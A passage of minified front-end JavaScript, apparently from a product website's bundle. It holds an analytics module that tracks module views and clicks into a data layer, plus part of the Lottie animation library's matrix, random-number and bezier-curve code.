      <slot @slotchange=${this.onSlotChange}></slot>`}disconnectedCallback(){super.disconnectedCallback(),this.dispatch(Bn.Event.DISCONNECTED,{}),this.addUserConditions&&this.addUserConditions.dispose(),this.addViewInAr&&this.addViewInAr.dispose(),this.replaceDataTooltips&&this.replaceDataTooltips.dispose(),this.youtubeModal&&this.youtubeModal.dispose(),this.hasFirstUpdateCompleted=!1}},(dr=Bn).Event=vd,zt([Ur({type:Boolean,attribute:"disable-analytics"})],dr.prototype,"disableAnalytics",2)})),Rc,Mc,yd=Ge((()=>{Rc=()=>{let t=document.querySelector("[data-product-family-docid]");return t?t.getAttribute("data-product-family-docid"):""},Mc=()=>{let t=document.querySelector("[data-product-docid]");return t?t.getAttribute("data-product-docid"):""}}));function h$(...t){(Tf("MQN_ANALYTICS")||localStorage.getItem("MQN_ANALYTICS"))&&console.log("[analytics]",...t)}function f$(t){return t.match(/(category|config|magazine|product)\/([^/?]+)/)?.[2]}function _d(t){let e="eventParams"in t;e&&u$.includes(t.eventParams?.moduleType)||(e&&ma?_n().then((e=>{e.logEvent(t)})):(window.dataLayer=window.dataLayer||[],window.dataLayer.push(t)),(Tf("MQN_ANALYTICS")||localStorage.getItem("MQN_ANALYTICS"))&&console.table(t))}var Ji,ao,u$,La,Sc=Ge((()=>{var t;zy(),jy(),vn(),ws(),va(),cc(),ys(),bs(),yd(),(t=Ji||(Ji={}))[t.INVIEW=0]="INVIEW",t[t.OUTVIEW=1]="OUTVIEW",t[t.CLICK=2]="CLICK",t.TRACK_CLICK="track-click",ao={label:["mqn-autotrack-label","track-label"],category:["mqn-autotrack-category","track-category"],event:["mqn-autotrack-event","track-event"],click:["mqn-autotrack-label","track-click"],template:["mqn-autotrack-partial-type","track-template","template"]},u$=["template_external_spacer","blockSpacer","template-geo-flex.soy","template_query_param_control"],La=class{constructor(t,e=!1){this.delegateDisposer=null,this.initialized=!1,this.app=t,this.watcher=new Ar,ma&&!e?this.watcher.add({element:document,on:dr.Event.NEO_TRACKING_NAVIGATION,callback:()=>{this.init()},eventOptions:{once:!0}}):this.init(),this.watcher.add({element:this.app,on:dr.Event.DISCONNECTED,callback:this.dispose.bind(this)});let i=Array.from(this.app.querySelectorAll("a[href]:not([track-click]), a[data-ak-youtubemodal-video-id]:not([track-click])"));for(let t of i)"BENTO-BUTTON"!==t.parentElement.tagName&&t.setAttribute("track-click",t.href||t.innerText)}static register(t){return new La(t)}init(){this.initialized||(this.initialized=!0,this.setupInviewMonitoring(),this.setupClickMonitoring())}getAttributes(t,e,i=null){for(let i of e){let e=t.getAttribute(i);if(e)return e}return i}async track(t,e,i){h$("track",t);let r=await this.getTrackingPayload(t,e,i);this.trackDataLayer(r)}async getTrackingPayload(t,e,i){return new Promise((r=>{(async()=>{let n,s=window.location.pathname,o=i?.linkText||t?.getAttribute("track-link-text")||i?.label||"(not set)",a=this.getAttributes(this.app,ao.template),l=this.app.id||a,h=this.getAttributes(t,ao.label,"module interaction"),c=Rc(),u=Mc(),d=i?.destinationUrl??t.getAttribute("href"),p=d?.startsWith("http")||d?.startsWith("/");if(d?.startsWith("http")&&(d=d.replace(/^https?:\/\//,""),d=d.split(/[?#]/)[0]),2===e){c=void 0,u=void 0,u=t.getAttribute("doc-id")||t.getAttribute("price-doc-id")||t.getAttribute("track-product-doc-id"),(d?.includes("/product")||d?.includes("/config"))&&(n=f$(d));let e=u||n;if(e){let t=await(await _n()).fetchProductCtaData([e]);t.get(e)&&(c=t.get(e)?.productFamilyDocid)}}let m,f=this.getAttributes(t,ao.event,"module interaction"),g=this.getAttributes(t,ao.category,"module click"),y=p?d:i?.label||h;if(2===e)m={event:f,eventAction:i?.eventAction??l,eventCategory:g,eventLabel:y,nonInteraction:"0",eventParams:{moduleName:i?.moduleName??l,moduleType:a,pageName:s,actionDetails:y,destinationUrl:p?d:void 0,linkText:o,productDetailsPageDocId:n,productFamilyDocId:c,productDocId:u}};else{let r=0===e;if(r&&(this.inviewStartTime=Date.now()),m={event:r?"module inview":"module outview",eventAction:i?.eventAction??l,eventCategory:this.getAttributes(t,ao.category,r?"module inview":"module outview"),eventLabel:o,nonInteraction:"1",eventParams:{moduleName:i?.moduleName??l,moduleType:a,pageName:s,productDetailsPageDocId:u,productDocId:u}},!r){let t=(Date.now()-this.inviewStartTime)/1e3;m.eventParams.secondsInView=t}}for(let t in m)m[t]||delete m[t];(h.includes("/config/")||d?.includes("/config/"))&&(this.trackDataLayer(m),m={...m,products:m.eventLabel.replace("/config/",""),event:"buy_now",eventAction:l,eventCategory:"module click",eventLabel:"buy now"}),r(m)})()}))}setupInviewMonitoring(){let t=()=>{this.outviewEv=lc.inview(this.app,{},((t,e,i)=>{!e.isIntersecting&&window.scrollY>=0&&(this.track(this.app,1),i())}))};this.inviewEv=lc.inview(this.app,{threshold:.3},((e,i,r)=>{i.isIntersecting&&(this.track(this.app,0),r(),t())}))}setupClickMonitoring(){this.delegateDisposer=ga(this.app,"click",(t=>{if(t.isBentoTrackClick)return;let e=this.getAttributes(t,ao.click,t.getAttribute("label"));e&&this.track(t,2,{label:e})})),this.watcher.add({element:this.app,on:Ji.TRACK_CLICK,callback:t=>{this.track(t.detail.target,2,{destinationUrl:t.detail.destinationUrl,label:t.detail.label,linkText:t.detail.options?.linkText})}})}trackDataLayer(t){_d(t)}dispose(){this.inviewEv&&this.inviewEv.dispose(),this.outviewEv&&this.outviewEv.dispose(),this.delegateDisposer&&this.delegateDisposer(),this.watcher&&this.watcher.dispose(),this.initialized=!1}}})),en=st(((t,e)=>{Sc(),e.exports={trackDataLayer:function(t){_d(t),window.URLSearchParams&&new URLSearchParams(window.location.search).has("MQN2_ANALYTICS_DEBUG")&&(window.MQN2_DEBUG_ANALYTICS=!0),window.MQN2_DEBUG_ANALYTICS&&console.log(t)},getClosestTrackingId:function(t){let e=window.jQuery(t).closest("[mqn-tracking-id]")[0];e||(e=window.jQuery(t).closest("[mqn-tracking-ref]")[0]);let i=e.getAttribute("mqn-tracking-id");return i||(i=e.getAttribute("mqn-tracking-ref")),i}}})),Fa=st(((exports,module)=>{var t,e;"undefined"!=typeof navigator&&(t=window||{},e=function(window){"use strict";var svgNS="http://www.w3.org/2000/svg",locationHref="",initialDefaultFrame=-999999,subframeEnabled=!0,expressionsPlugin,isSafari=/^((?!chrome|android).)*safari/i.test(navigator.userAgent),cachedColors={},bm_rounder=Math.round,bm_rnd,bm_pow=Math.pow,bm_sqrt=Math.sqrt,bm_abs=Math.abs,bm_floor=Math.floor,bm_max=Math.max,bm_min=Math.min,blitter=10,BMMath={};function ProjectInterface(){return{}}!function(){var t,e=["abs","acos","acosh","asin","asinh","atan","atanh","atan2","ceil","cbrt","expm1","clz32","cos","cosh","exp","floor","fround","hypot","imul","log","log1p","log2","log10","max","min","pow","random","round","sign","sin","sinh","sqrt","tan","tanh","trunc","E","LN10","LN2","LOG10E","LOG2E","PI","SQRT1_2","SQRT2"],i=e.length;for(t=0;t<i;t+=1)BMMath[e[t]]=Math[e[t]]}(),BMMath.random=Math.random,BMMath.abs=function(t){if("object"==typeof t&&t.length){var e,i=createSizedArray(t.length),r=t.length;for(e=0;e<r;e+=1)i[e]=Math.abs(t[e]);return i}return Math.abs(t)};var defaultCurveSegments=150,degToRads=Math.PI/180,roundCorner=.5519;function roundValues(t){bm_rnd=t?Math.round:function(t){return t}}function styleDiv(t){t.style.position="absolute",t.style.top=0,t.style.left=0,t.style.display="block",t.style.transformOrigin=t.style.webkitTransformOrigin="0 0",t.style.backfaceVisibility=t.style.webkitBackfaceVisibility="visible",t.style.transformStyle=t.style.webkitTransformStyle=t.style.mozTransformStyle="preserve-3d"}function BMEnterFrameEvent(t,e,i,r){this.type=t,this.currentTime=e,this.totalTime=i,this.direction=r<0?-1:1}function BMCompleteEvent(t,e){this.type=t,this.direction=e<0?-1:1}function BMCompleteLoopEvent(t,e,i,r){this.type=t,this.currentLoop=i,this.totalLoops=e,this.direction=r<0?-1:1}function BMSegmentStartEvent(t,e,i){this.type=t,this.firstFrame=e,this.totalFrames=i}function BMDestroyEvent(t,e){this.type=t,this.target=e}function BMRenderFrameErrorEvent(t,e){this.type="renderFrameError",this.nativeError=t,this.currentTime=e}function BMConfigErrorEvent(t){this.type="configError",this.nativeError=t}function BMAnimationConfigErrorEvent(t,e){this.type=t,this.nativeError=e,this.currentTime=currentTime}roundValues(!1);var createElementID=(t=0,function(){return"__lottie_element_"+ ++t}),t;function HSVtoRGB(t,e,i){var r,n,s,o,a,l,h,c;switch(l=i*(1-e),h=i*(1-(a=6*t-(o=Math.floor(6*t)))*e),c=i*(1-(1-a)*e),o%6){case 0:r=i,n=c,s=l;break;case 1:r=h,n=i,s=l;break;case 2:r=l,n=i,s=c;break;case 3:r=l,n=h,s=i;break;case 4:r=c,n=l,s=i;break;case 5:r=i,n=l,s=h}return[r,n,s]}function RGBtoHSV(t,e,i){var r,n=Math.max(t,e,i),s=Math.min(t,e,i),o=n-s,a=0===n?0:o/n,l=n/255;switch(n){case s:r=0;break;case t:r=e-i+o*(e<i?6:0),r/=6*o;break;case e:r=i-t+2*o,r/=6*o;break;case i:r=t-e+4*o,r/=6*o}return[r,a,l]}function addSaturationToRGB(t,e){var i=RGBtoHSV(255*t[0],255*t[1],255*t[2]);return i[1]+=e,i[1]>1?i[1]=1:i[1]<=0&&(i[1]=0),HSVtoRGB(i[0],i[1],i[2])}function addBrightnessToRGB(t,e){var i=RGBtoHSV(255*t[0],255*t[1],255*t[2]);return i[2]+=e,i[2]>1?i[2]=1:i[2]<0&&(i[2]=0),HSVtoRGB(i[0],i[1],i[2])}function addHueToRGB(t,e){var i=RGBtoHSV(255*t[0],255*t[1],255*t[2]);return i[0]+=e/360,i[0]>1?i[0]-=1:i[0]<0&&(i[0]+=1),HSVtoRGB(i[0],i[1],i[2])}var rgbToHex=function(){var t,e,i=[];for(t=0;t<256;t+=1)e=t.toString(16),i[t]=1==e.length?"0"+e:e;return function(t,e,r){return t<0&&(t=0),e<0&&(e=0),r<0&&(r=0),"#"+i[t]+i[e]+i[r]}}();function BaseEvent(){}BaseEvent.prototype={triggerEvent:function(t,e){if(this._cbs[t])for(var i=this._cbs[t].length,r=0;r<i;r++)this._cbs[t][r](e)},addEventListener:function(t,e){return this._cbs[t]||(this._cbs[t]=[]),this._cbs[t].push(e),function(){this.removeEventListener(t,e)}.bind(this)},removeEventListener:function(t,e){if(e){if(this._cbs[t]){for(var i=0,r=this._cbs[t].length;i<r;)this._cbs[t][i]===e&&(this._cbs[t].splice(i,1),i-=1,r-=1),i+=1;this._cbs[t].length||(this._cbs[t]=null)}}else this._cbs[t]=null}};var createTypedArray="function"==typeof Uint8ClampedArray&&"function"==typeof Float32Array?function(t,e){return"float32"===t?new Float32Array(e):"int16"===t?new Int16Array(e):"uint8c"===t?new Uint8ClampedArray(e):void 0}:function(t,e){var i,r=0,n=[];switch(t){case"int16":case"uint8c":i=1;break;default:i=1.1}for(r=0;r<e;r+=1)n.push(i);return n};function createSizedArray(t){return Array.apply(null,{length:t})}function createNS(t){return document.createElementNS(svgNS,t)}function createTag(t){return document.createElement(t)}function DynamicPropertyContainer(){}DynamicPropertyContainer.prototype={addDynamicProperty:function(t){-1===this.dynamicProperties.indexOf(t)&&(this.dynamicProperties.push(t),this.container.addDynamicProperty(this),this._isAnimated=!0)},iterateDynamicProperties:function(){this._mdf=!1;var t,e=this.dynamicProperties.length;for(t=0;t<e;t+=1)this.dynamicProperties[t].getValue(),this.dynamicProperties[t]._mdf&&(this._mdf=!0)},initDynamicPropertyContainer:function(t){this.container=t,this.dynamicProperties=[],this._mdf=!1,this._isAnimated=!1}};var getBlendMode=function(){var t={0:"source-over",1:"multiply",2:"screen",3:"overlay",4:"darken",5:"lighten",6:"color-dodge",7:"color-burn",8:"hard-light",9:"soft-light",10:"difference",11:"exclusion",12:"hue",13:"saturation",14:"color",15:"luminosity"};return function(e){return t[e]||""}}(),Matrix=function(){var t=Math.cos,e=Math.sin,i=Math.tan,r=Math.round;function n(){return this.props[0]=1,this.props[1]=0,this.props[2]=0,this.props[3]=0,this.props[4]=0,this.props[5]=1,this.props[6]=0,this.props[7]=0,this.props[8]=0,this.props[9]=0,this.props[10]=1,this.props[11]=0,this.props[12]=0,this.props[13]=0,this.props[14]=0,this.props[15]=1,this}function s(i){if(0===i)return this;var r=t(i),n=e(i);return this._t(r,-n,0,0,n,r,0,0,0,0,1,0,0,0,0,1)}function o(i){if(0===i)return this;var r=t(i),n=e(i);return this._t(1,0,0,0,0,r,-n,0,0,n,r,0,0,0,0,1)}function a(i){if(0===i)return this;var r=t(i),n=e(i);return this._t(r,0,n,0,0,1,0,0,-n,0,r,0,0,0,0,1)}function l(i){if(0===i)return this;var r=t(i),n=e(i);return this._t(r,-n,0,0,n,r,0,0,0,0,1,0,0,0,0,1)}function h(t,e){return this._t(1,e,t,1,0,0)}function c(t,e){return this.shear(i(t),i(e))}function u(r,n){var s=t(n),o=e(n);return this._t(s,o,0,0,-o,s,0,0,0,0,1,0,0,0,0,1)._t(1,0,0,0,i(r),1,0,0,0,0,1,0,0,0,0,1)._t(s,-o,0,0,o,s,0,0,0,0,1,0,0,0,0,1)}function d(t,e,i){return!i&&0!==i&&(i=1),1===t&&1===e&&1===i?this:this._t(t,0,0,0,0,e,0,0,0,0,i,0,0,0,0,1)}function p(t,e,i,r,n,s,o,a,l,h,c,u,d,p,m,f){return this.props[0]=t,this.props[1]=e,this.props[2]=i,this.props[3]=r,this.props[4]=n,this.props[5]=s,this.props[6]=o,this.props[7]=a,this.props[8]=l,this.props[9]=h,this.props[10]=c,this.props[11]=u,this.props[12]=d,this.props[13]=p,this.props[14]=m,this.props[15]=f,this}function m(t,e,i){return i=i||0,0!==t||0!==e||0!==i?this._t(1,0,0,0,0,1,0,0,0,0,1,0,t,e,i,1):this}function f(t,e,i,r,n,s,o,a,l,h,c,u,d,p,m,f){var g=this.props;if(1===t&&0===e&&0===i&&0===r&&0===n&&1===s&&0===o&&0===a&&0===l&&0===h&&1===c&&0===u)return g[12]=g[12]*t+g[15]*d,g[13]=g[13]*s+g[15]*p,g[14]=g[14]*c+g[15]*m,g[15]=g[15]*f,this._identityCalculated=!1,this;var y=g[0],v=g[1],_=g[2],b=g[3],w=g[4],E=g[5],S=g[6],A=g[7],C=g[8],T=g[9],$=g[10],I=g[11],P=g[12],x=g[13],k=g[14],O=g[15];return g[0]=y*t+v*n+_*l+b*d,g[1]=y*e+v*s+_*h+b*p,g[2]=y*i+v*o+_*c+b*m,g[3]=y*r+v*a+_*u+b*f,g[4]=w*t+E*n+S*l+A*d,g[5]=w*e+E*s+S*h+A*p,g[6]=w*i+E*o+S*c+A*m,g[7]=w*r+E*a+S*u+A*f,g[8]=C*t+T*n+$*l+I*d,g[9]=C*e+T*s+$*h+I*p,g[10]=C*i+T*o+$*c+I*m,g[11]=C*r+T*a+$*u+I*f,g[12]=P*t+x*n+k*l+O*d,g[13]=P*e+x*s+k*h+O*p,g[14]=P*i+x*o+k*c+O*m,g[15]=P*r+x*a+k*u+O*f,this._identityCalculated=!1,this}function g(){return this._identityCalculated||(this._identity=!(1!==this.props[0]||0!==this.props[1]||0!==this.props[2]||0!==this.props[3]||0!==this.props[4]||1!==this.props[5]||0!==this.props[6]||0!==this.props[7]||0!==this.props[8]||0!==this.props[9]||1!==this.props[10]||0!==this.props[11]||0!==this.props[12]||0!==this.props[13]||0!==this.props[14]||1!==this.props[15]),this._identityCalculated=!0),this._identity}function y(t){for(var e=0;e<16;){if(t.props[e]!==this.props[e])return!1;e+=1}return!0}function v(t){var e;for(e=0;e<16;e+=1)t.props[e]=this.props[e]}function _(t){var e;for(e=0;e<16;e+=1)this.props[e]=t[e]}function b(t,e,i){return{x:t*this.props[0]+e*this.props[4]+i*this.props[8]+this.props[12],y:t*this.props[1]+e*this.props[5]+i*this.props[9]+this.props[13],z:t*this.props[2]+e*this.props[6]+i*this.props[10]+this.props[14]}}function w(t,e,i){return t*this.props[0]+e*this.props[4]+i*this.props[8]+this.props[12]}function E(t,e,i){return t*this.props[1]+e*this.props[5]+i*this.props[9]+this.props[13]}function S(t,e,i){return t*this.props[2]+e*this.props[6]+i*this.props[10]+this.props[14]}function A(){var t=this.props[0]*this.props[5]-this.props[1]*this.props[4],e=this.props[5]/t,i=-this.props[1]/t,r=-this.props[4]/t,n=this.props[0]/t,s=(this.props[4]*this.props[13]-this.props[5]*this.props[12])/t,o=-(this.props[0]*this.props[13]-this.props[1]*this.props[12])/t,a=new Matrix;return a.props[0]=e,a.props[1]=i,a.props[4]=r,a.props[5]=n,a.props[12]=s,a.props[13]=o,a}function C(t){return this.getInverseMatrix().applyToPointArray(t[0],t[1],t[2]||0)}function T(t){var e,i=t.length,r=[];for(e=0;e<i;e+=1)r[e]=C(t[e]);return r}function $(t,e,i){var r=createTypedArray("float32",6);if(this.isIdentity())r[0]=t[0],r[1]=t[1],r[2]=e[0],r[3]=e[1],r[4]=i[0],r[5]=i[1];else{var n=this.props[0],s=this.props[1],o=this.props[4],a=this.props[5],l=this.props[12],h=this.props[13];r[0]=t[0]*n+t[1]*o+l,r[1]=t[0]*s+t[1]*a+h,r[2]=e[0]*n+e[1]*o+l,r[3]=e[0]*s+e[1]*a+h,r[4]=i[0]*n+i[1]*o+l,r[5]=i[0]*s+i[1]*a+h}return r}function I(t,e,i){return this.isIdentity()?[t,e,i]:[t*this.props[0]+e*this.props[4]+i*this.props[8]+this.props[12],t*this.props[1]+e*this.props[5]+i*this.props[9]+this.props[13],t*this.props[2]+e*this.props[6]+i*this.props[10]+this.props[14]]}function P(t,e){if(this.isIdentity())return t+","+e;var i=this.props;return Math.round(100*(t*i[0]+e*i[4]+i[12]))/100+","+Math.round(100*(t*i[1]+e*i[5]+i[13]))/100}function x(){for(var t=0,e=this.props,i="matrix3d(";t<16;)i+=r(1e4*e[t])/1e4,i+=15===t?")":",",t+=1;return i}function k(t){return t<1e-6&&t>0||t>-1e-6&&t<0?r(1e4*t)/1e4:t}function O(){var t=this.props;return"matrix("+k(t[0])+","+k(t[1])+","+k(t[4])+","+k(t[5])+","+k(t[12])+","+k(t[13])+")"}return function(){this.reset=n,this.rotate=s,this.rotateX=o,this.rotateY=a,this.rotateZ=l,this.skew=c,this.skewFromAxis=u,this.shear=h,this.scale=d,this.setTransform=p,this.translate=m,this.transform=f,this.applyToPoint=b,this.applyToX=w,this.applyToY=E,this.applyToZ=S,this.applyToPointArray=I,this.applyToTriplePoints=$,this.applyToPointStringified=P,this.toCSS=x,this.to2dCSS=O,this.clone=v,this.cloneFromProps=_,this.equals=y,this.inversePoints=T,this.inversePoint=C,this.getInverseMatrix=A,this._t=this.transform,this.isIdentity=g,this._identity=!0,this._identityCalculated=!1,this.props=createTypedArray("float32",16),this.reset()}}();!function(t,e){var i=this,r=256,n="random",s=e.pow(r,6),o=e.pow(2,52),a=2*o,l=255;function h(t){var e,i=t.length,n=this,s=0,o=n.i=n.j=0,a=n.S=[];for(i||(t=[i++]);s<r;)a[s]=s++;for(s=0;s<r;s++)a[s]=a[o=l&o+t[s%i]+(e=a[s])],a[o]=e;n.g=function(t){for(var e,i=0,s=n.i,o=n.j,a=n.S;t--;)e=a[s=l&s+1],i=i*r+a[l&(a[s]=a[o=l&o+e])+(a[o]=e)];return n.i=s,n.j=o,i}}function c(t,e){return e.i=t.i,e.j=t.j,e.S=t.S.slice(),e}function u(t,e){var i,r=[],n=typeof t;if(e&&"object"==n)for(i in t)try{r.push(u(t[i],e-1))}catch(t){}return r.length?r:"string"==n?t:t+"\0"}function d(t,e){for(var i,r=t+"",n=0;n<r.length;)e[l&n]=l&(i^=19*e[l&n])+r.charCodeAt(n++);return p(e)}function p(t){return String.fromCharCode.apply(0,t)}e["seed"+n]=function(l,m,f){var g=[],y=d(u((m=!0===m?{entropy:!0}:m||{}).entropy?[l,p(t)]:null===l?function(){try{var e=new Uint8Array(r);return(i.crypto||i.msCrypto).getRandomValues(e),p(e)}catch(e){var n=i.navigator,s=n&&n.plugins;return[+new Date,i,s,i.screen,p(t)]}}():l,3),g),v=new h(g),_=function(){for(var t=v.g(6),e=s,i=0;t<o;)t=(t+i)*r,e*=r,i=v.g(1);for(;t>=a;)t/=2,e/=2,i>>>=1;return(t+i)/e};return _.int32=function(){return 0|v.g(4)},_.quick=function(){return v.g(4)/4294967296},_.double=_,d(p(v.S),t),(m.pass||f||function(t,i,r,s){return s&&(s.S&&c(s,v),t.state=function(){return c(v,{})}),r?(e[n]=t,i):t})(_,y,"global"in m?m.global:this==e,m.state)},d(e.random(),t)}([],BMMath);var BezierFactory=function(){var t={getBezierEasing:function(t,i,r,n,s){var o=s||("bez_"+t+"_"+i+"_"+r+"_"+n).replace(/\./g,"p");if(e[o])return e[o];var a=new h([t,i,r,n]);return e[o]=a,a}},e={},i=.1,r="function"==typeof Float32Array;function n(t,e){return 1-3*e+3*t}function s(t,e){return 3*e-6*t}function o(t){return 3*t}function a(t,e,i){return((n(e,i)*t+s(e,i))*t+o(e))*t}function l(t,e,i){return 3*n(e,i)*t*t+2*s(e,i)*t+o(e)}function h(t){this._p=t,this._mSampleValues=r?new Float32Array(11):new Array(11),this._precomputed=!1,this.get=this.get.bind(this)}return h.prototype={get:function(t){var e=this._p[0],i=this._p[1],r=this._p[2],n=this._p[3];return this._precomputed||this._precompute(),e===i&&r===n?t:0===t?0:1===t?1:a(this._getTForX(t),i,n)},_precompute:function(){var t=this._p[0],e=this._p[1],i=this._p[2],r=this._p[3];this._precomputed=!0,(t!==e||i!==r)&&this._calcSampleValues()},_calcSampleValues:function(){for(var t=this._p[0],e=this._p[2],r=0;r<11;++r)this._mSampleValues[r]=a(r*i,t,e)},_getTForX:function(t){for(var e=this._p[0],r=this._p[2],n=this._mSampleValues,s=0,o=1;10!==o&&n[o]<=t;++o)s+=i;var h=s+(t-n[--o])/(n[o+1]-n[o])*i,c=l(h,e,r);return c>=.001?function(t,e,i,r){for(var n=0;n<4;++n){var s=l(e,i,r);if(0===s)return e;e-=(a(e,i,r)-t)/s}return e}(t,h,e,r):0===c?h:function(t,e,i,r,n){var s,o,l=0;do{(s=a(o=e+(i-e)/2,r,n)-t)>0?i=o:e=o}while(Math.abs(s)>1e-7&&++l<10);return o}(t,s,s+i,e,r)}},t}();function extendPrototype(t,e){var i,r,n=t.length;for(i=0;i<n;i+=1)for(var s in r=t[i].prototype)r.hasOwnProperty(s)&&(e.prototype[s]=r[s])}function getDescriptor(t,e){return Object.getOwnPropertyDescriptor(t,e)}function createProxyFunction(t){function e(){}return e.prototype=t,e}function bezFunction(){function t(t,e,i,r,n,s){var o=t*r+e*n+i*s-n*r-s*t-i*e;return o>-.001&&o<.001}Math;var e=function(t,e,i,r){var n,s,o,a,l,h,c=defaultCurveSegments,u=0,d=[],p=[],m=bezier_length_pool.newElement();for(o=i.length,n=0;n<c;n+=1){for(l=n/(c-1),h=0,s=0;s<o;s+=1)a=bm_pow(1-l,3)*t[s]+3*bm_pow(1-l,2)*l*i[s]+3*(1-l)*bm_pow(l,2)*r[s]+bm_pow(l,3)*e[s],d[s]=a,null!==p[s]&&(h+=bm_pow(d[s]-p[s],2)),p[s]=d[s];h&&(u+=h=bm_sqrt(h)),m.percents[n]=l,m.lengths[n]=u}return m.addedLength=u,m};function i(t){this.segmentLength=0,this.points=new Array(t)}function r(t,e){this.partialLength=t,this.point=e}var n,s=(n={},function(e,s,o,a){var l=(e[0]+"_"+e[1]+"_"+s[0]+"_"+s[1]+"_"+o[0]+"_"+o[1]+"_"+a[0]+"_"+a[1]).replace(/\./g,"p");if(!n[l]){var h,c,u,d,p,m,f,g=defaultCurveSegments,y=0,v=null;2===e.length&&(e[0]!=s[0]||e[1]!=s[1])&&t(e[0],e[1],s[0],s[1],e[0]+o[0],e[1]+o[1])&&t(e[0],e[1],s[0],s[1],s[0]+a[0],s[1]+a[1])&&(g=2);var _=new i(g);for(u=o.length,h=0;h<g;h+=1){for(f=createSizedArray(u),p=h/(g-1),m=0,c=0;c<u;c+=1)d=bm_pow(1-p,3)*e[c]+3*bm_pow(1-p,2)*p*(e[c]+o[c])+3*(1-p)*bm_pow(p,2)*(s[c]+a[c])+bm_pow(p,3)*s[c],f[c]=d,null!==v&&(m+=bm_pow(f[c]-v[c],2));y+=m=bm_sqrt(m),_.points[h]=new r(m,f),v=f}_.segmentLength=y,n[l]=_}return n[l]});function o(t,e){var i=e.percents,r=e.lengths,n=i.length,s=bm_floor((n-1)*t),o=t*e.addedLength,a=0;if(s===n-1||0===s||o===r[s])return i[s];for(var l=r[s]>o?-1:1,h=!0;h;)if(r[s]<=o&&r[s+1]>o?(a=(o-r[s])/(r[s+1]-r[s]),h=!1):s+=l,s<0||s>=n-1){if(s===n-1)return i[s];h=!1}return i[s]+(i[s+1]-i[s])*a}var a=createTypedArray("float32",8);return{getSegmentsLength:function(t){var i,r=segments_length_pool.newElement(),n=t.c,s=t.v,o=t.o,a=t.i,l=t._length,h=r.lengths,c=0;for(i=0;i<l-1;i+=1)h[i]=e(s[i],s[i+1],o[i],a[i+1]),c+=h[i].addedLength;return n&&l&&(h[i]=e(s[i],s[0],o[i],a[0]),c+=h[i].addedLength),r.totalLength=c,r},getNewSegment:function(t,e,i,r,n,s,l){var h,c=o(n=n<0?0:n>1?1:n,l),u=o(s=s>1?1:s,l),d=t.length,p=1-c,m=1-u,f=p*p*p,g=c*p*p*3,y=c*c*p*3,v=c*c*c,_=p*p*m,b=c*p*m+p*c*m+p*p*u,w=c*c*m+p*c*u+c*p*u,E=c*c*u,S=p*m*m,A=c*m*m+p*u*m+p*m*u,C=c*u*m+p*u*u+c*m*u,T=c*u*u,$=m*m*m,I=u*m*m+m*u*m+m*m*u,P=u*u*m+m*u*u+u*m*u,x=u*u*u;for(h=0;h<d;h+=1)a[4*h]=Math.round(1e3*(f*t[h]+g*i[h]+y*r[h]+v*e[h]))/1e3,a[4*h+1]=Math.round(1e3*(_*t[h]+b*i[h]+w*r[h]+E*e[h]))/1e3,a[4*h+2]=Math.round(1e3*(S*t[h]+A*i[h]+C*r[h]+T*e[h]))/1e3,a[4*h+3]=Math.round(1e3*($*t[h]+I*i[h]+P*r[h]+x*e[h]))/1e3;return a},getPointInSegment:function(t,e,i,r,n,s){var a=o(n,s),l=1-a;return[Math.round(1e3*(l*l*l*t[0]+(a*l*l+l*a*l+l*l*a)*i[0]+(a*a*l+l*a*a+a*l*a)*r[0]+a*a*a*e[0]))/1e3,Math.round(1e3*(l*l*l*t[1]+(a*l*l+l*a*l+l*l*a)*i[1]+(a*a*l+l*a*a+a*l*a)*r[1]+a*a*a*e[1]))/1e3]},buildBezierData:s,pointOnLine2D:t,pointOnLine3D:function(e,i,r,n,s,o,a,l,h){if(0===r&&0===o&&0===h)return t(e,i,n,s,a,l);var c,u=Math.sqrt(Math.pow(n-e,2)+Math.pow(s-i,2)+Math.pow(o-r,2)),d=Math.sqrt(Math.pow(a-e,2)+Math.pow(l-i,2)+Math.pow(h-r,2)),p=Math.sqrt(Math.pow(a-n,2)+Math.pow(l-s,2)+Math.pow(h-o,2));return(c=u>d?u>p?u-d-p:p-d-u:p>d?p-d-u:d-u-p)>-1e-4&&c<1e-4}}}!function(){for(var t=0,e=["ms","moz","webkit","o"],i=0;i<e.length&&!window.requestAnimationFrame;++i)window.requestAnimationFrame=window[e[i]+"RequestAnimationFrame"],window.cancelAnimationFrame=window[e[i]+"CancelAnimationFrame"]||window[e[i]+"CancelRequestAnimationFrame"];window.requestAnimationFrame||(window.requestAnimationFrame=function(e,i){var r=(new Date).getTime(),n=Math.max(0,16-(r-t)),s=setTimeout((function(){e(r+n)}),n);return t=r+n,s}),window.cancelAnimationFrame||(window.cancelAnimationFrame=function(t){clearTimeout(t)})}();var bez=bezFunction();function dataFunctionManager(){function t(n,s,o){var a,l,h,u,d,p,m=n.length;for(l=0;l<m;l+=1)if("ks"in(a=n[l])&&!a.completed){if(a.completed=!0,a.tt&&(n[l-1].td=a.tt),a.hasMask){var f=a.masksProperties;for(u=f.length,h=0;h<u;h+=1)if(f[h].pt.k.i)r(f[h].pt.k);else for(p=f[h].pt.k.length,d=0;d<p;d+=1)f[h].pt.k[d].s&&r(f[h].pt.k[d].s[0]),f[h].pt.k[d].e&&r(f[h].pt.k[d].e[0])}0===a.ty?(a.layers=e(a.refId,s),t(a.layers,s,o)):4===a.ty?i(a.shapes):5==a.ty&&c(a)}}function e(t,e){for(var i=0,r=e.length;i<r;){if(e[i].id===t)return e[i].layers.__used?JSON.parse(JSON.stringify(e[i].layers)):(e[i].layers.__used=!0,e[i].layers);i+=1}}function i(t){var e,n,s;for(e=t.length-1;e>=0;e-=1)if("sh"==t[e].ty)if(t[e].ks.k.i)r(t[e].ks.k);else for(s=t[e].ks.k.length,n=0;n<s;n+=1)t[e].ks.k[n].s&&r(t[e].ks.k[n].s[0]),t[e].ks.k[n].e&&r(t[e].ks.k[n].e[0]);else"gr"==t[e].ty&&i(t[e].it)}function r(t){var e,i=t.i.length;for(e=0;e<i;e+=1)t.i[e][0]+=t.v[e][0],t.i[e][1]+=t.v[e][1],t.o[e][0]+=t.v[e][0],t.o[e][1]+=t.v[e][1]}function n(t,e){var i=e?e.split("."):[100,100,100];return t[0]>i[0]||!(i[0]>t[0])&&(t[1]>i[1]||!(i[1]>t[1])&&(t[2]>i[2]||!(i[2]>t[2])&&void 0))}var s,o=function(){var t=[4,4,14];function e(t){var e=t.t.d;t.t.d={k:[{s:e,t:0}]}}function i(t){var i,r=t.length;for(i=0;i<r;i+=1)5===t[i].ty&&e(t[i])}return function(e){if(n(t,e.v)&&(i(e.layers),e.assets)){var 